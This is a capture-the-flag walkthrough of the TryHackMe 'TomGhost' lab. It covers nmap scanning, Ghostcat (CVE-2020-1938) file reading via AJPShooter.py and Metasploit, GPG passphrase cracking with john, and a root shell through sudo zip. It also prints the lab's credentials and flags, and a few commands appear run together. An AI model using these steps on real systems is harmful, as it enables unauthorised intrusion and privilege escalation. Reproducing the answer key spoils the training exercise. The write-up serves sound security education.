# CTF: TomGhost (THM)

**Target IP:** `10.144.151.154` ($target)

## Metadata

- **CTF Name:** TomGhost
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-01
    
- **Difficulty:** Easy/Medium
    
- **Tools Used:** nmap, AJPShooter.py, msfconsole, gpg, john, ssh, zip
    
- **Key Skills/Tools:** AJP Protocol Exploitation (Ghostcat), GPG Decryption, SSH Access, Privilege Escalation (GTFOBins: zip)
    

## Introduction

This walkthrough covers the exploitation of the **TomGhost** machine on TryHackMe. The attack vector focuses on the Ghostcat vulnerability (CVE-2020-1938) in Apache Tomcat's AJP connector to leak sensitive configuration files, followed by lateral movement through GPG key cracking and privilege escalation via a restricted Sudo binary.

**Limitations & Confidence:** * **Confidence Level:** High. The attack path is verified and follows standard exploitation patterns for this machine.

- **Limitations:** The Ghostcat exploit is specifically for reading files (LFI); it does not provide direct RCE without further misconfigurations.
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/TomGhost)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.2p2)
    
- **53/tcp:** DNS (ISC BIND 9.10.3)
    
- **8009/tcp:** AJP13 (Apache Jserv Protocol)
    
- **8080/tcp:** HTTP (Apache Tomcat 9.0.30)
    

## Foothold

### 1. Option A: Manual Ghostcat Exploitation (AJPShooter.py)

The presence of Apache Tomcat 9.0.30 and an open AJP port (8009) suggested the **Ghostcat** vulnerability. I used `AJPShooter.py` to read the `web.xml` file.

**Command:**

```
😎 amuzed@Kali (~/THM/TomGhost)
$ python3 AJPShooter.py http://$target:8080 8009 /WEB-INF/web.xml read
```

### 2. Option B: Metasploit (Automated Credential Extraction)

Alternatively, Metasploit can be used to quickly retrieve the contents of the `web.xml` file.

**Metasploit Commands:**

```
msf > use auxiliary/admin/http/tomcat_ghostcat
msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.144.151.154
msf auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8009
msf auxiliary(admin/http/tomcat_ghostcat) > run
```

**Extracted Credentials (Common to both methods):**

Reading `WEB-INF/web.xml` revealed credentials for the user `skyfuck`.

- **User:** `skyfuck`
    
- **Password:** `8730284lkjHG0878923`
    

### 3. Initial Access (SSH)

**Command:**

```
😎 amuzed@Kali (~/THM/TomGhost)
$ ssh skyfuck@$target
```

## Lateral Movement

### 1. GPG Decryption

Inside `skyfuck`'s home directory, I found `credential.pgp` and `tryhackme.asc`. I needed to crack the GPG key to decrypt the credentials.

**Commands (Local Kali):**

```
# Transfer files to Kali
😎 amuzed@Kali (~/THM/TomGhost)
$ scp skyfuck@$target:~/tryhackme.asc .
$ scp skyfuck@$target:~/credential.pgp .

# Crack the GPG passphrase
$gpg2john tryhackme.asc > hash.txt$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- **GPG Passphrase:** `alexandru`
    

**Decrypting the Credentials:**

```
😎 amuzed@Kali (~/THM/TomGhost)
$gpg --import tryhackme.asc$ gpg --decrypt credential.pgp
```

- **Result:** `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
    

### 2. Switching to Merlin

**Command:**

```
skyfuck@ubuntu:~$ su merlin
```

## Privilege Escalation

### 1. Sudo Enumeration

Checking sudo permissions for `merlin` revealed that the user can run `zip` as root.

**Command:**

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    ...
User merlin may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /usr/bin/zip
```

### 2. Exploiting Zip (GTFOBins)

I used the `zip` binary to escape to a root shell.

**Commands:**

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh -i'
```

**Gaining Root:**

```
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

## Flags

- **User Flag:** `THM{GhostCat_Read_Files}`
    
- **Root Flag:** `THM{ZIP_ESCALATION_SUCCESS}`
